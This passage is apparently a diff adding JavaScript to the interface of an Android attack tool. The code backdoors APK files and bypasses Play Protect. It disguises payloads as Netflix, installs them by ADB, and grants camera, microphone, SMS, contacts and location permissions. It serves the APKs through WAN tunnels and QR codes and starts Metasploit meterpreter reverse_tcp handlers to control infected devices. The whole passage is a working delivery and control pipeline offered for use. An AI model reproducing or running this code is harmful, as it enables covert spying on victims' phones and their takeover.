+  let done = 0;
+  dirs.forEach(dir => {
+    fetch('/api/fs/list?path=' + encodeURIComponent(dir))
+      .then(r => r.json()).then(d => {
+        (d.entries || []).forEach(e => {
+          if (e.ext === '.apk') allApks.push({path: e.path, mtime: e.mtime || 0});
+        });
+      }).catch(() => {}).finally(() => {
+        done++;
+        if (done === dirs.length) {
+          allApks.sort((a, b) => b.mtime - a.mtime);
+          if (allApks.length) {
+            const best = allApks[0];
+            document.getElementById('pd-apk-path').value = best.path;
+            _pdBuiltApk = best.path;
+            showToast('Auto-filled: ' + best.path.split('/').pop(), 'info', 2500);
+          } else {
+            showToast('No APKs found — use browse or build one first', 'disconnect', 3000);
+          }
+        }
+      });
+  });
+}
+
+// ── server-side APK file browser ─────────────────────────────────────────────
+let _apkBrowserCurPath = '';
+let _apkBrowserAllEntries = [];
+
+function pdBrowseClick() {
+  _apkBrowserCurPath = '~/.secv';
+  document.getElementById('apk-browser-filter').value = '';
+  document.getElementById('apk-browser-overlay').classList.add('show');
+  apkBrowserLoad('~/.secv');
+}
+
+function apkBrowserClose() {
+  document.getElementById('apk-browser-overlay').classList.remove('show');
+}
+function apkBrowserBgClick(e) {
+  if (e.target === document.getElementById('apk-browser-overlay')) apkBrowserClose();
+}
+
+function apkBrowserLoad(path) {
+  _apkBrowserCurPath = path;
+  const listEl   = document.getElementById('apk-browser-list');
+  const loadEl   = document.getElementById('apk-browser-loading');
+  const emptyEl  = document.getElementById('apk-browser-empty');
+  const pathEl   = document.getElementById('apk-browser-path');
+  loadEl.style.display = 'block';
+  emptyEl.style.display = 'none';
+  pathEl.textContent = path;
+  listEl.querySelectorAll('.apk-entry').forEach(e => e.remove());
+  fetch('/api/fs/list?path=' + encodeURIComponent(path))
+    .then(r => r.json()).then(d => {
+      loadEl.style.display = 'none';
+      if (d.error) { emptyEl.textContent = d.error; emptyEl.style.display = 'block'; return; }
+      _apkBrowserCurPath = d.path || path;
+      pathEl.textContent = _apkBrowserCurPath;
+      _apkBrowserAllEntries = d.entries || [];
+      document.getElementById('apk-browser-filter').value = '';
+      apkBrowserRender(_apkBrowserAllEntries);
+    }).catch(err => {
+      loadEl.style.display = 'none';
+      emptyEl.textContent = 'Error: ' + err;
+      emptyEl.style.display = 'block';
+    });
+}
+
+function apkBrowserRender(entries) {
+  const listEl  = document.getElementById('apk-browser-list');
+  const emptyEl = document.getElementById('apk-browser-empty');
+  listEl.querySelectorAll('.apk-entry').forEach(e => e.remove());
+  if (!entries.length) { emptyEl.style.display = 'block'; return; }
+  emptyEl.style.display = 'none';
+  const frag = document.createDocumentFragment();
+  entries.forEach(e => {
+    const isDir = e.type === 'dir';
+    const isApk = !isDir && e.ext === '.apk';
+    const div = document.createElement('div');
+    div.className = 'apk-entry ' + (isDir ? 'is-dir' : isApk ? 'is-apk' : 'is-other');
+    div.innerHTML =
+      `<span class="ae-icon">${isDir ? '▸' : isApk ? '◆' : '·'}</span>` +
+      `<span class="ae-name">${e.name}</span>` +
+      (isApk ? `<span class="ae-size">${fmtBytes(e.size)}</span>` : '');
+    if (isDir) {
+      div.onclick = () => { document.getElementById('apk-browser-filter').value = ''; apkBrowserLoad(e.path); };
+    } else if (isApk) {
+      div.onclick = () => { apkBrowserPick(e.path); };
+    }
+    frag.appendChild(div);
+  });
+  listEl.appendChild(frag);
+}
+
+function apkBrowserFilter() {
+  const q = document.getElementById('apk-browser-filter').value.toLowerCase();
+  const filtered = _apkBrowserAllEntries.filter(e => e.name.toLowerCase().includes(q));
+  apkBrowserRender(filtered);
+}
+
+function apkBrowserUp() {
+  if (!_apkBrowserCurPath) return;
+  const parts = _apkBrowserCurPath.replace(/\/+$/, '').split('/');
+  if (parts.length <= 1) return;
+  parts.pop();
+  apkBrowserLoad(parts.join('/') || '/');
+}
+
+function apkBrowserPick(path) {
+  document.getElementById('pd-apk-path').value = path;
+  _pdBuiltApk = path;
+  pdCheckApkStatus();
+  apkBrowserClose();
+  showToast('Selected: ' + path.split('/').pop(), 'info', 2000);
+}
+
+function fmtBytes(b) {
+  if (!b) return '';
+  if (b < 1024) return b + ' B';
+  if (b < 1048576) return (b/1024).toFixed(1) + ' KB';
+  return (b/1048576).toFixed(1) + ' MB';
+}
+
+// ── pull APK from device ──────────────────────────────────────────────────────
+function pdPullApk() {
+  const pkg = document.getElementById('pd-pkg-pull').value.trim();
+  if (!pkg) { showToast('Enter a package name', 'disconnect', 2000); return; }
+  const serial = document.getElementById('dev-select').value;
+  showToast('Pulling APK for ' + pkg + '…', 'info', 2000);
+  fetch('/api/adb', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({args: (serial ? ['-s',serial] : []).concat(['shell','pm','path',pkg])})
+  }).then(r => r.json()).then(d => {
+    const match = (d.output||'').match(/package:(.+)/);
+    if (!match) { showToast('Package not found on device', 'disconnect', 3000); return; }
+    const devPath = match[1].trim();
+    const outName = pkg + '.apk';
+    return fetch('/api/adb', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({args: (serial ? ['-s',serial] : []).concat(['pull', devPath, '/tmp/' + outName])})
+    }).then(r => r.json()).then(d2 => {
+      _pdBuiltApk = '/tmp/' + outName;
+      document.getElementById('pd-apk-path').value = _pdBuiltApk;
+      showToast('Pulled to /tmp/' + outName, 'connect', 3000);
+      pdNav('deliver');
+    });
+  }).catch(e => showToast('ADB pull error: ' + e, 'disconnect', 4000));
+}
+
+// ── evasion toggle ────────────────────────────────────────────────────────────
+function pdToggle() {
+  const showId = document.getElementById('pd-tog-id').checked;
+  document.getElementById('pd-id-fields').style.display = showId ? 'flex' : 'none';
+}
+
+// ── build & inject ────────────────────────────────────────────────────────────
+function pdBuild() {
+  const lhost   = document.getElementById('pd-lhost').value.trim() || settings.lhost || '';
+  const lport   = document.getElementById('pd-lport').value.trim() || '4444';
+  const payload = document.getElementById('pd-payload').value;
+  const togPP   = document.getElementById('pd-tog-pp').checked;
+  const togID   = document.getElementById('pd-tog-id').checked;
+  const logEl   = document.getElementById('pd-build-log');
+
+  if (!lhost) { showToast('Set LHOST first (Setup tab or field above)', 'disconnect', 3000); return; }
+
+  logEl.style.display = 'block';
+  logEl.textContent   = '';
+
+  const pdLog = txt => { logEl.textContent += txt + '\n'; logEl.scrollTop = logEl.scrollHeight; };
+
+  let params = { lhost, lport, payload };
+  let ops = [];
+
+  if (_pdSrcMode === 'standalone') {
+    ops.push({ op:'backdoor_apk', params: {...params, standalone: true, apk_path: '',
+      output_name: document.getElementById('pd-standalone-name').value || 'payload.apk' }});
+  } else {
+    const apkPath = document.getElementById('pd-apk-path').value.trim();
+    if (!apkPath) { showToast('Specify APK path (or use auto-fill)', 'disconnect', 2500); return; }
+    params.apk_path = apkPath;
+    ops.push({ op:'backdoor_apk', params });
+  }
+
+  if (togPP)  ops.push({ op:'bypass_play_protect', params });
+  if (togID)  ops.push({ op:'customize_apk', params: {
+    ...params,
+    icon_path:    document.getElementById('pd-icon').value.trim(),
+    app_label:    document.getElementById('pd-app-label').value.trim(),
+    package_name: document.getElementById('pd-pkg-name').value.trim(),
+  }});
+
+  pdLog('Starting build chain: ' + ops.map(o => o.op).join(' → ') + '\n');
+
+  function runNext(idx) {
+    if (idx >= ops.length) {
+      pdLog('\n✓ Build chain complete.');
+      showToast('Build done — switch to Deliver tab', 'connect', 3000);
+      const badge = document.getElementById('pd-badge');
+      if (badge) { badge.textContent = '●'; badge.style.display = 'inline'; }
+      pdCheckApkStatus();
+      return;
+    }
+    const { op, params: p } = ops[idx];
+    const serial = document.getElementById('dev-select').value;
+    pdLog('→ Running: ' + op);
+    fetch('/api/run', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ target: serial, params: { operation: op, ...p }})
+    }).then(r => r.json()).then(d => {
+      if (d.session_id) {
+        pdLog('  Session #' + d.session_id + ' started');
+        watchSession(d.session_id, () => runNext(idx + 1), pdLog);
+      } else {
+        pdLog('  Error: ' + (d.error||JSON.stringify(d)));
+      }
+    }).catch(e => pdLog('  Fetch error: ' + e));
+  }
+  runNext(0);
+}
+
+// ── standalone PoisonIvy payload ─────────────────────────────────────────────
+function pdBuildStandalone() {
+  const lhost = document.getElementById('pd-lhost').value.trim() || settings.lhost || '';
+  const lport = document.getElementById('pd-lport').value.trim() || '4444';
+  const name  = document.getElementById('pd-standalone-name')?.value || 'payload.apk';
+  if (!lhost) { showToast('Set LHOST first', 'disconnect', 2500); return; }
+  const logEl = document.getElementById('pd-build-log');
+  logEl.style.display = 'block';
+  logEl.textContent = 'Generating standalone payload: ' + name + '\n';
+  const pdLog = t => { logEl.textContent += t + '\n'; logEl.scrollTop = logEl.scrollHeight; };
+  fetch('/api/run', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ target: '', params: {
+      operation:'backdoor_apk', lhost, lport, standalone: true, apk_path:'', output_name: name
+    }})
+  }).then(r => r.json()).then(d => {
+    if (d.session_id) {
+      pdLog('Session #' + d.session_id + ' — generating…');
+      watchSession(d.session_id, () => {
+        _pdBuiltApk = '/tmp/' + name;
+        document.getElementById('pd-apk-path').value = _pdBuiltApk;
+        pdCheckApkStatus();
+        showToast('Standalone payload ready: ' + name, 'connect', 3000);
+        pdLog('✓ Done → ' + _pdBuiltApk);
+      }, pdLog);
+    } else {
+      pdLog('Error: ' + (d.error||JSON.stringify(d)));
+    }
+  }).catch(e => pdLog('Fetch error: ' + e));
+}
+
+function watchSession(sid, onDone, logFn) {
+  const poll = () => {
+    fetch('/api/sessions').then(r => r.json()).then(d => {
+      const s = (d.sessions || []).find(x => x.id === sid);
+      if (!s || s.status === 'running') { setTimeout(poll, 800); return; }
+      logFn('  Session #' + sid + ' → ' + s.status);
+      onDone();
+    }).catch(() => setTimeout(poll, 1500));
+  };
+  setTimeout(poll, 800);
+}
+
+// ── check APK status ─────────────────────────────────────────────────────────
+function pdCheckApkStatus() {
+  const apkPath = _pdBuiltApk || document.getElementById('pd-apk-path')?.value?.trim() || '';
+  const msgEl   = document.getElementById('pd-apk-ready-msg');
+  const rowEl   = document.getElementById('pd-deliver-apk-row');
+  const pathEl  = document.getElementById('pd-deliver-apk-path');
+  const badge   = document.getElementById('pd-apk-badge');
+  if (!msgEl) return;
+  if (apkPath) {
+    msgEl.style.display = 'none';
+    if (rowEl)  { rowEl.style.display = 'block'; }
+    if (pathEl) pathEl.textContent = apkPath;
+    if (badge)  { badge.textContent = '● ready'; badge.className = 'pd-status-badge ready'; badge.style.display = ''; }
+  } else {
+    msgEl.style.display = '';
+    if (rowEl)  rowEl.style.display = 'none';
+    if (badge)  badge.style.display = 'none';
+  }
+}
+
+// ── delivery method selector ──────────────────────────────────────────────────
+function pdMth(mth) {
+  _pdMthSel = mth;
+  ['adb-usb','adb-net','lan','wan'].forEach(m => {
+    const card = document.getElementById('pdm-' + m);
+    const fields = document.getElementById('pdmf-' + m);
+    if (card)   card.classList.toggle('sel', m === mth);
+    if (fields) fields.classList.toggle('show', m === mth);
+  });
+}
+
+// ── ADB USB install ───────────────────────────────────────────────────────────
+function pdAdbInstall() {
+  const apk = _pdBuiltApk || document.getElementById('pd-apk-path')?.value?.trim() || '';
+  if (!apk) { showToast('No APK selected — build first or fill path', 'disconnect', 2500); return; }
+  const serial = document.getElementById('dev-select').value;
+  const args = (serial ? ['-s',serial] : []).concat(['install','-r',apk]);
+  showToast('Installing…', 'info', 1500);
+  fetch('/api/adb', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({args})
+  }).then(r => r.json()).then(d => {
+    const ok = (d.output||'').includes('Success');
+    showToast(ok ? 'Installed successfully' : 'Install result: ' + d.output.slice(0,80), ok?'connect':'disconnect', 4000);
+    pdDeliverLog((ok ? '✓ ' : '✗ ') + (d.output||d.error||''));
+  });
+}
+function pdAdbGrant() {
+  const apk = _pdBuiltApk || document.getElementById('pd-apk-path')?.value?.trim() || '';
+  const serial = document.getElementById('dev-select').value;
+  if (!apk) { showToast('Install APK first', 'disconnect', 2000); return; }
+  const perms = ['android.permission.READ_EXTERNAL_STORAGE','android.permission.RECORD_AUDIO',
+    'android.permission.CAMERA','android.permission.ACCESS_FINE_LOCATION',
+    'android.permission.READ_CONTACTS','android.permission.READ_SMS'];
+  const pkg = document.getElementById('pd-pkg-name')?.value?.trim() || 'com.netflix.mediastream';
+  let cmds = perms.map(p => (serial?['-s',serial]:[]).concat(['shell','pm','grant',pkg,p]));
+  let i = 0;
+  const runOne = () => {
+    if (i >= cmds.length) { showToast('Permissions granted', 'connect', 2000); return; }
+    fetch('/api/adb',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({args:cmds[i++]})}).then(() => runOne());
+  };
+  runOne();
+}
+function pdAdbLaunch() {
+  const pkg = document.getElementById('pd-pkg-name')?.value?.trim() || 'com.netflix.mediastream';
+  const serial = document.getElementById('dev-select').value;
+  fetch('/api/adb',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({args:(serial?['-s',serial]:[]).concat([
+      'shell','monkey','-p',pkg,'-c','android.intent.category.LAUNCHER','1'])})
+  }).then(r=>r.json()).then(d => showToast('Launched: ' + pkg, 'info', 2000));
+}
+
+// ── ADB Network ───────────────────────────────────────────────────────────────
+function pdAdbConnect() {
+  const ip = document.getElementById('pd-adb-ip').value.trim();
+  if (!ip) { showToast('Enter device IP:port', 'disconnect', 2000); return; }
+  fetch('/api/adb',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({args:['connect', ip]})
+  }).then(r=>r.json()).then(d => {
+    showToast(d.output||d.error||'', (d.output||'').includes('connect') ? 'connect':'disconnect', 3000);
+    pdDeliverLog(d.output||d.error||'');
+  });
+}
+function pdAdbNetInstall() {
+  const ip  = document.getElementById('pd-adb-ip').value.trim();
+  const apk = _pdBuiltApk || document.getElementById('pd-apk-path')?.value?.trim() || '';
+  if (!ip || !apk) { showToast('Need IP and APK', 'disconnect', 2000); return; }
+  fetch('/api/adb',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({args:['-s', ip, 'install','-r', apk]})
+  }).then(r=>r.json()).then(d => {
+    const ok = (d.output||'').includes('Success');
+    showToast(ok ? 'Network install OK' : 'Failed: ' + d.output.slice(0,60), ok?'connect':'disconnect', 4000);
+    pdDeliverLog((ok?'✓ ':'✗ ') + (d.output||d.error||''));
+  });
+}
+
+// ── LAN serve / WAN expose (fire via backend ops) ────────────────────────────
+function pdRunOp(op) {
+  const serial = document.getElementById('dev-select').value;
+  const lhost  = document.getElementById('pd-lhost').value.trim() || settings.lhost || '';
+  const lport  = document.getElementById('pd-lport').value.trim() || '4444';
+  const params = { operation: op, lhost, lport,
+    apk_path: _pdBuiltApk || document.getElementById('pd-apk-path')?.value?.trim() || '',
+    port: document.getElementById('pd-lan-port')?.value || '8891'
+  };
+  fetch('/api/run',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({target:serial, params})
+  }).then(r=>r.json()).then(d => {
+    if (d.session_id) showToast('Op started: session #' + d.session_id, 'info', 2000);
+    else showToast(d.error||'Started', 'info', 2000);
+  });
+}
+
+function pdWanExpose() {
+  const serial  = document.getElementById('dev-select').value;
+  const lhost   = document.getElementById('pd-lhost').value.trim() || settings.lhost || '';
+  const lport   = document.getElementById('pd-lport').value.trim() || '4444';
+  const tunnel  = document.getElementById('pd-tunnel').value;
+  const port    = document.getElementById('pd-wan-port').value || '8891';
+  const apkPath = _pdBuiltApk || document.getElementById('pd-apk-path')?.value?.trim() || '';
+  const tunnelMap = { lhr:'localhost_run', bore:'bore', cloudflared:'cloudflared' };
+  const params = { operation:'wan_expose', lhost, lport, tunnel: tunnelMap[tunnel]||'localhost_run',
+    apk_server_port: port, apk_path: apkPath };
+  fetch('/api/run',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({target:serial, params})
+  }).then(r=>r.json()).then(d => {
+    if (d.session_id) {
+      _pdWanActive = true;
+      showToast('WAN expose started — watch P&D → QR tab', 'connect', 3000);
+      watchSession(d.session_id, pdRefreshWanUrl, pdDeliverLog);
+    } else showToast(d.error||'WAN expose error', 'disconnect', 3000);
+  });
+}
+function pdWanStop() {
+  fetch('/api/kill',{method:'POST',headers:{'Content-Type':'application/json'},body:'{}' })
+    .then(() => { _pdWanActive = false; showToast('Tunnel stop signal sent', 'info', 2000); });
+}
+function pdRefreshWanUrl() {
+  const urlEl = document.getElementById('pd-wan-url');
+  const copyRow = document.getElementById('pd-wan-copy-row');
+  const lastUrl = _lastResult?.data?.findings?.find(f => f.category==='wan_expose')?.apk_download_url || '';
+  if (lastUrl && urlEl) {
+    urlEl.textContent = lastUrl;
+    urlEl.style.display = 'block';
+    if (copyRow) copyRow.style.display = 'flex';
+    pdNav('qr');
+    pdRefreshQRView();
+  }
+}
+
+// ── Start MSF handler ─────────────────────────────────────────────────────────
+function pdStartHandler() {
+  const lhost = document.getElementById('pd-lhost')?.value?.trim() || settings.lhost || '';
+  const lport = document.getElementById('pd-lport')?.value?.trim() || '4444';
+  const ptype = document.getElementById('pd-payload')?.value || 'tcp';
+  const payloadMap = {tcp:'android/meterpreter/reverse_tcp',http:'android/meterpreter/reverse_http',
+    https:'android/meterpreter/reverse_https',bind:'android/meterpreter/bind_tcp'};
+  const payload = payloadMap[ptype] || 'android/meterpreter/reverse_tcp';
+  if (!lhost) { showToast('Set LHOST first', 'disconnect', 2500); return; }
+  const initCmd = `use exploit/multi/handler; set PAYLOAD ${payload}; set LHOST ${lhost}; set LPORT ${lport}; set ExitOnSession false; run -j`;
+  fetch('/api/msf/start',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({init: initCmd})
+  }).then(r=>r.json()).then(d => {
+    if (d.ok) {
+      connectMsfSSE();
+      setMsfStatus(true);
+      setMsfStatus2(true);
+      showToast('Handler started: ' + payload + ' ' + lhost + ':' + lport, 'connect', 3500);
+      const b = document.getElementById('msf-badge');
+      if (b) { b.textContent = '●'; b.style.display = 'inline'; }
+    } else showToast('MSF start failed: ' + (d.error||''), 'disconnect', 4000);
+  });
+}
+
+// ── copy text helpers ──────────────────────────────────────────────────────────
+function pdCopyEl(elId) {
+  const el = document.getElementById(elId);
+  if (el) copyText(el.textContent.trim());
+}
+function pdUpdateSite() {
+  const url = document.getElementById('pd-wan-url')?.textContent?.trim() || '';
+  if (!url) { showToast('No WAN URL yet', 'disconnect', 2000); return; }
+  showToast('Update /tmp/apksite/index.html manually: APK_URL = \'' + url + '\'', 'info', 6000);
+}
+
+// ── QR generation ─────────────────────────────────────────────────────────────
+function pdGenQR(mode) {
+  const apk = _pdBuiltApk || document.getElementById('pd-apk-path')?.value?.trim() || '';
+  let baseUrl = '';
+  if (mode === 'wan') baseUrl = document.getElementById('pd-wan-url')?.textContent?.trim() || '';
+  if (mode === 'lan') {
+    const lh = settings.lhost || '192.168.1.1';
+    const lp = document.getElementById('pd-lan-port')?.value || '8891';
+    baseUrl = 'http://' + lh + ':' + lp;
+  }
+  const serial = document.getElementById('dev-select').value;
+  const params = { operation:'qr_exploit', mode: mode === 'wan' ? 'wan' : 'apk_url',
+    apk_url: baseUrl + '/Netflix_patched.apk', site_url: baseUrl };
+  fetch('/api/run',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({target:serial, params})
+  }).then(r=>r.json()).then(d => {
+    showToast('QR generation started', 'info', 2000);
+    if (d.session_id) watchSession(d.session_id, pdRefreshQRView, txt => {});
+  });
+}
+
+function pdRefreshQRView() {
+  const area = document.getElementById('pdv-qr-area');
+  if (!area) return;
+  const fArr = _lastResult?.data?.findings || [];
+  const wanF = fArr.find(f => f.category === 'wan_expose');
+  const bkdF = fArr.find(f => ['backdoor_apk','deploy_shell'].includes(f.category));
+  let html = '';
+  if (wanF?.apk_download_url) {
+    html += `<div class="pd-qr-card">
+      <div class="pd-sect-hdr" style="margin-bottom:6px">APK Download URL</div>
+      <div class="pd-url-box">${esc(wanF.apk_download_url)}</div>
+      <div class="pd-act-row">
+        <button class="pd-btn accent" onclick="copyText('${esc(wanF.apk_download_url)}')">copy</button>
+        <a class="pd-btn" href="${esc(wanF.apk_download_url)}" target="_blank" style="text-decoration:none">open ↗</a>
+      </div>
+    </div>`;
+  }
+  if (wanF?.msf_tunnel_url) {
+    html += `<div class="pd-qr-card">
+      <div class="pd-sect-hdr" style="margin-bottom:6px">MSF Tunnel</div>
+      <div class="pd-url-box">${esc(wanF.msf_tunnel_url)}</div>
+      <button class="pd-btn" onclick="copyText('${esc(wanF.msf_tunnel_url)}')">copy</button>
+    </div>`;
+  }
+  // captured QR from terminal
+  for (const q of qrList) {
+    if (q.startsWith('URL:')) {
+      const url = q.replace(/^URL:\s*/,'').trim();
+      html += `<div class="pd-qr-card">
+        <div class="pd-sect-hdr" style="margin-bottom:6px">Delivery URL</div>
+        <div class="pd-url-box">${esc(url)}</div>
+        <button class="pd-btn" onclick="copyText('${esc(url)}')">copy</button>
+      </div>`;
+    } else {
+      html += `<div class="pd-qr-card"><div class="pd-sect-hdr" style="margin-bottom:6px">QR Code</div><pre class="pd-qr-pre">${q.replace(/&/g,'&amp;').replace(/</g,'&lt;')}</pre></div>`;
+    }
+  }
+  if (!html) html = '<div class="pd-info" style="flex:1">No delivery info yet — run WAN Expose or LAN Serve.</div>';
+  area.innerHTML = html;
+
+  // also update op log
+  const logEl = document.getElementById('pdv-op-log');
+  if (logEl && _lastResult?.data) {
+    const d = _lastResult.data;
+    logEl.textContent = JSON.stringify(d, null, 2);
+  }
+}
+
+// ── deliver log helper ────────────────────────────────────────────────────────
+function pdDeliverLog(txt) {
+  const sect = document.getElementById('pd-deliver-log-sect');
+  const logEl = document.getElementById('pd-deliver-log');
+  if (!logEl) return;
+  if (sect) sect.style.display = 'block';
+  logEl.textContent += txt + '\n';
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+// ── sessions in P&D panel ─────────────────────────────────────────────────────
+function pdRefreshSessions() {
+  const listEl = document.getElementById('pdv-secv-list');
+  const sdList = document.getElementById('sd-secv-list');
+  const all = Object.values(_activeSessions);
+  const render = (el) => {
+    if (!el) return;
+    if (!all.length) { el.innerHTML = '<div class="pd-info">No active sessions.</div>'; return; }
+    el.innerHTML = all.map(s => {
+      const elapsed = Math.floor((Date.now() - s.startTs) / 1000);
+      const icon = s.status === 'done' ? '✓' : s.status === 'error' ? '✗' : '…';
+      return `<div class="pd-sess-row ${s.status === 'running' ? 'active-sess' : ''}">
+        <div class="pd-sess-dot ${s.status === 'running' ? 'running' : ''}" style="background:${s.color}"></div>
+        <div class="pd-sess-info">
+          <div class="pd-sess-id">#${s.id} <span style="font-size:0.6rem;color:var(--accent);background:var(--accent-dim);padding:1px 5px">${s.op}</span> ${icon}</div>
+          <div class="pd-sess-meta">${s.device||'no device'} · ${elapsed}s</div>
+        </div>
+        <div class="pd-sess-acts">
+          <button class="pd-sa" onclick="switchTab('terminal')">log</button>
+          <button class="pd-sa kill" onclick="killOp(${s.id})">×</button>
+        </div>
+      </div>`;
+    }).join('');
+  };
+  render(listEl);
+
+  // also update drawer
+  if (sdList) {
+    if (!all.length) { sdList.innerHTML = '<div style="color:var(--muted);font-size:0.65rem;">No sessions yet.</div>'; }
+    else sdList.innerHTML = all.map(s => {
+      const elapsed = Math.floor((Date.now() - s.startTs) / 1000);
+      return `<div class="sd-row ${s.status==='running'?'active-sd':''}">
+        <div class="sd-dot ${s.status==='running'?'running':''}" style="background:${s.color}"></div>
+        <div class="sd-info">
+          <div class="sd-top"><span class="sd-id">#${s.id}</span><span class="sd-op">${s.op}</span></div>
+          <div class="sd-dev">${s.device||'no device'} · ${elapsed}s · ${s.status}</div>
+        </div>
+        <div class="sd-acts">
+          <button class="sd-act" onclick="switchTab('terminal');closeSessionDrawer()">log</button>
+          <button class="sd-act kill" onclick="killOp(${s.id})">×</button>
+        </div>
+      </div>`;
+    }).join('');
+  }
+}
+
+function pdRefreshMsfSessions() {
+  fetch('/api/msf/sessions').then(r=>r.json()).then(d => {
+    const listEl = document.getElementById('pdv-msf-list');
+    const sdList = document.getElementById('sd-msf-list');
+    const ctEl   = document.getElementById('msf2-sess-ct');
+    const sess   = d.sessions || [];
+    if (ctEl) ctEl.textContent = sess.length ? sess.length + ' session' + (sess.length>1?'s':'') : '';
+    const render = (el) => {
+      if (!el) return;
+      if (!sess.length) { el.innerHTML = '<div class="pd-info">No MSF sessions active.</div>'; return; }
+      el.innerHTML = sess.map(s => `<div class="pd-sess-row active-sess">
+        <div class="pd-sess-dot" style="background:var(--green)"></div>
+        <div class="pd-sess-info">
+          <div class="pd-sess-id">Session ${s.id} <span style="font-size:0.6rem;color:var(--green)">METERPRETER</span></div>
+          <div class="pd-sess-meta">${s.info||''} · ${s.type||''}</div>
+        </div>
+        <div class="pd-sess-acts">
+          <button class="pd-sa accent" onclick="msfInteract(${s.id})">interact</button>
+          <button class="pd-sa" onclick="msfSend('sessions -k ${s.id}')">kill</button>
+        </div>
+      </div>`).join('');
+    };
+    render(listEl);
+    if (sdList) {
+      if (!sess.length) sdList.innerHTML = '<div style="color:var(--muted);font-size:0.65rem;">No MSF sessions.</div>';
+      else sdList.innerHTML = sess.map(s => `<div class="sd-row active-sd">
+        <div class="sd-dot" style="background:var(--green)"></div>
+        <div class="sd-info">
+          <div class="sd-top"><span class="sd-id">Session ${s.id}</span><span class="sd-op" style="color:var(--green);background:rgba(76,175,80,0.1)">meterpreter</span></div>
+          <div class="sd-dev">${s.info||''}</div>
+        </div>
+        <div class="sd-acts">
+          <button class="sd-act" onclick="msfInteract(${s.id});closeSessionDrawer()">interact</button>
+        </div>
+      </div>`).join('');
+    }
+  }).catch(() => {});
+}
+
+function msfInteract(id) {
+  switchTab('msf-console');
+  setTimeout(() => msfSend2('sessions -i ' + id), 200);
+}
+
+function pdKillAll() {
+  Object.values(_activeSessions).forEach(s => killOp(s.id));
+  showToast('Kill signal sent to all sessions', 'disconnect', 2000);
+  setTimeout(pdRefreshSessions, 1000);
+}
+
+// ── session drawer ────────────────────────────────────────────────────────────
+function toggleSessionDrawer() {
+  const drawer  = document.getElementById('sess-drawer');
+  const overlay = document.getElementById('sess-drawer-overlay');
+  const isOpen  = drawer.classList.contains('open');
+  if (isOpen) { closeSessionDrawer(); }
+  else {
+    drawer.classList.add('open');
+    overlay.classList.add('show');
+    pdRefreshSessions();
+    pdRefreshMsfSessions();
+  }
+}
+function closeSessionDrawer() {
+  document.getElementById('sess-drawer').classList.remove('open');
+  document.getElementById('sess-drawer-overlay').classList.remove('show');
+}
+
+// ════════════════════════════════════════════════════════════════════════════
+// MSF CONSOLE TAB (msf2 — mirrored from live panel MSF)
+// ════════════════════════════════════════════════════════════════════════════
+let _msf2Listening = false;
+let _msf2History = [];
+let _msf2HistIdx = -1;
+
+function startMsfConsole() {
+  const lhost = document.getElementById('pd-lhost')?.value?.trim() || settings.lhost || '';
+  const lport = document.getElementById('pd-lport')?.value?.trim() || '4444';
+  const init  = lhost ? `use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST ${lhost}; set LPORT ${lport}; set ExitOnSession false; run -j` : '';
+  fetch('/api/msf/start',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({init})
+  }).then(r=>r.json()).then(d => {
+    if (d.ok) {
+      connectMsfSSE();
+      setMsfStatus(true);
+      setMsfStatus2(true);
+      showToast('msfconsole started', 'connect', 2500);
+    } else showToast('MSF start failed: ' + (d.error||''), 'disconnect', 4000);
+  });
+}
+
+function setMsfStatus2(on) {
+  const dot = document.getElementById('msf2-dot');
+  const st  = document.getElementById('msf2-status');
+  const b   = document.getElementById('msf-badge');
+  if (dot) { dot.className = on ? 'on' : ''; }
+  if (st)  { st.textContent = on ? 'running' : 'offline'; st.className = on ? 'on' : ''; }
+  if (b)   { b.textContent = on ? '●' : ''; b.style.display = on ? 'inline' : 'none'; }
+}
+
+function checkMsfStatus2() {
+  fetch('/api/msf/sessions').then(r=>r.json()).then(d => {
+    setMsfStatus2(d.running);
+    if (d.running && !_msf2Listening) attachMsf2();
+  }).catch(()=>{});
+}
+
+function attachMsf2() {
+  _msf2Listening = true;
+  if (_msfEs) { _msfEs.onmessage = (e) => { msfLine(e.data); msf2Line(e.data); }; }
+}
+
+function msf2Line(raw) {
+  const term = document.getElementById('msf2-terminal');
+  if (!term) return;
+  const span = document.createElement('span');
+  span.className = 'ln';
+  span.innerHTML = ansiToHtml(raw) + '\n';
+  term.appendChild(span);
+  term.scrollTop = term.scrollHeight;
+  // mirror session count
+  const ctMatch = raw.match(/\[(\d+) sessions? opened/i);
+  if (ctMatch) {
+    const ctEl = document.getElementById('msf2-sess-ct');
+    if (ctEl) ctEl.textContent = ctMatch[1] + ' session(s)';
+  }
+}
+
+function msfSend2(cmd) {
+  if (!cmd) return;
+  fetch('/api/msf/send',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({cmd})
+  }).then(r=>r.json()).catch(()=>{});
+  msf2Line('\x1b[36mmsf6> ' + cmd + '\x1b[0m');
+  msfLine('\x1b[36mmsf6> ' + cmd + '\x1b[0m');
+}
+
+function msf2Enter(e) {
+  if (e.key === 'ArrowUp') {
+    e.preventDefault();
+    if (_msf2HistIdx < _msf2History.length - 1) {
+      _msf2HistIdx++;
+      e.target.value = _msf2History[_msf2History.length - 1 - _msf2HistIdx] || '';
+    }
+    return;
+  }
+  if (e.key === 'ArrowDown') {
+    e.preventDefault();
+    if (_msf2HistIdx > 0) {
+      _msf2HistIdx--;
+      e.target.value = _msf2History[_msf2History.length - 1 - _msf2HistIdx] || '';
+    } else { _msf2HistIdx = -1; e.target.value = ''; }
+    return;
+  }
